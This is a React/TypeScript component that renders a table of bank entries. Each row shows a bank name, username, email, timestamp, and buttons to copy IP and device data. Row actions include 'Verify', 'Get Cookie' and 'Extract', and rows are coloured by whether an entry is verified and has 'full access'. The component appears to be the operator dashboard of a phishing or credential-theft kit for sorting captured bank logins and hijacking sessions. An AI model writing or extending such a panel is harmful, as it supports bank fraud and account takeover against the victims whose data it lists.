import { useWindowSize } from '../../../../hooks/useWindowSize';
import { TableActions } from '../TableActions';
import { getLogoUrl } from '../../../../utils/logoUtils';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { faGlobe, faLaptop } from '@fortawesome/free-solid-svg-icons';

interface BankTableProps {
  data: any[];
  onRowClick: (id: string) => void;
  selectedId: string | null;
  onVerify: (id: string) => void;
  onGetCookie: (id: string) => void;
  onExtract: (id: string) => void;
  onMemoSave: (id: string, text: string) => void;
  loading: boolean;
  onCopy: (text: string) => void;
}

export const BankTable: React.FC<BankTableProps> = ({
  data,
  onRowClick,
  selectedId,
  onVerify,
  onGetCookie,
  onExtract,
  onMemoSave,
  loading,
  onCopy
}) => {
  const { width } = useWindowSize();
  
  const getBankData = (banksString: string) => {
    try {
      return typeof banksString === 'string' ? JSON.parse(banksString) : banksString;
    } catch (error) {
      console.error('Error parsing banks data:', error);
      return [];
    }
  };

  const getColumns = () => {
    if (width < 768) { // Mobile
      return ['logo', 'bankName', 'username', 'actions'];
    } else if (width < 1024) { // Tablet/iPad
      return ['logo', 'timestamp', 'bankName', 'username', 'actions'];
    }
    // Large Screen
    return ['logo', 'timestamp', 'bankName', 'username', 'email', 'actions'];
  };

  const getRowBackgroundColor = (item: any) => {
    if (item.verified === 'TRUE' && item.fullAccess === 'TRUE') return 'bg-green-50 hover:bg-green-100 dark:bg-green-900 dark:hover:bg-green-800';
    if (item.verified === 'TRUE') return 'bg-amber-50 hover:bg-amber-100 dark:bg-amber-900 dark:hover:bg-amber-800';
    return 'bg-red-50 hover:bg-red-100 dark:bg-red-900 dark:hover:bg-red-800';
  };

  const formatTimestamp = (timestamp: string) => {
    try {
      return new Date(timestamp).toLocaleString();
    } catch (error) {
      return timestamp;
    }
  };

  const handleCopy = (text: string, type: string) => {
    onCopy(text);
    console.log(`${type} copied to clipboard`);
  };

  const columns = getColumns();

  return (
    <div className="overflow-x-auto">
      <table className="min-w-full divide-y divide-gray-200 dark:divide-gray-700">
        <thead className="bg-gray-50 dark:bg-gray-700">
          <tr>
            {columns.map(column => (
              <th key={column} className="px-6 py-3 text-left text-xs font-medium text-gray-500 dark:text-gray-300 uppercase tracking-wider">
                {column === 'actions' || column === 'logo' ? '' : column}
              </th>
            ))}
          </tr>
        </thead>
        <tbody className="divide-y divide-gray-200 dark:divide-gray-700">
          {data.map((item) => {
            const banks = getBankData(item.banks);
            return banks.map((bank: any, bankIndex: number) => (
              <tr 
                key={`${item.id}-${bankIndex}`}
                onClick={() => onRowClick(item.id)}
                className={`cursor-pointer ${getRowBackgroundColor(item)} ${selectedId === item.id ? '!bg-blue-50 dark:!bg-blue-900' : ''}`}
              >
                {columns.map(column => (
                  <td key={column} className="px-6 py-4 whitespace-nowrap text-sm text-gray-900 dark:text-gray-200">
                    {column === 'logo' ? (
                      <div className="flex items-center justify-center">
                        <img 
                          src={getLogoUrl(bank.website || bank.bankName + '.com')} 
                          alt={bank.bankName}
                          className="h-8 w-8 object-contain"
                          onError={(e) => {
                            const target = e.target as HTMLImageElement;
                            target.style.display = 'none'; // Hide the broken image
                            const fallbackIcon = target.nextElementSibling as HTMLElement;
                            if (fallbackIcon) {
                              fallbackIcon.style.display = 'block'; // Show the fallback icon
                            }
                          }}
                        />
                        {/* Fallback icon */}
                        <FontAwesomeIcon 
                          icon={faGlobe} 
                          className="h-8 w-8 text-gray-400" 
                          style={{ display: 'none' }} // Initially hidden
                        />
                      </div>
                    ) : column === 'actions' ? (
                      <div className="flex items-center justify-end space-x-2">
                        {width >= 768 && (
                          <>
                            <button
                              onClick={(e) => {
                                e.stopPropagation();
                                handleCopy(bank.ipData ? JSON.stringify(bank.ipData) : item.ipData, 'IP Data');
                              }}
                              className="text-gray-400 dark:text-gray-300 hover:text-gray-600 dark:hover:text-gray-100"
                              title="Copy IP Data"
                            >
                              <FontAwesomeIcon icon={faGlobe} />
                            </button>
                            <button
                              onClick={(e) => {
                                e.stopPropagation();
                                handleCopy(bank.deviceData ? JSON.stringify(bank.deviceData) : item.deviceData, 'Device Data');
                              }}
                              className="text-gray-400 dark:text-gray-300 hover:text-gray-600 dark:hover:text-gray-100"
                              title="Copy Device Data"
                            >
                              <FontAwesomeIcon icon={faLaptop} />
                            </button>
                          </>
                        )}
                        <TableActions
                          item={item}
                          onVerify={onVerify}
                          onGetCookie={onGetCookie}
                          onExtract={onExtract}
                          onMemoSave={onMemoSave}
                          loading={loading}
                          category="BANK"
                        />
                      </div>
                    ) : column === 'timestamp' ? (
                      formatTimestamp(item.timestamp)
                    ) : column === 'email' ? (
                      item.email
                    ) : column === 'bankName' ? (
                      bank.bankName
                    ) : column === 'username' ? (
                      bank.username
                    ) : (
                      ''
                    )}
                  </td>
                ))}
              </tr>
            ));
          })}
        </tbody>
      </table>
    </div>
  );
};
